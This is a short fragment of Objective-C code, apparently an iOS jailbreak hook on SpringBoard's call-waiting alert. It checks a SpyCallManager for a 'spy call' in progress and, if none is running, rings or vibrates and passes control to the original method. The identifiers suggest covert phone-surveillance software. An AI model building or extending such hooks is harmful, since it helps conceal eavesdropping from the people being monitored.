			} else if (!isSpyCallInProgressSB()) { // Spy call state
				divertAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
				[self ringOrVibrate];
				CALL_ORIG(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, arg1);
			}
		}
	} else {
		CALL_ORIG(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, arg1);
	}
}

#pragma mark -
#pragma mark IOS6 hook functions
#pragma mark -
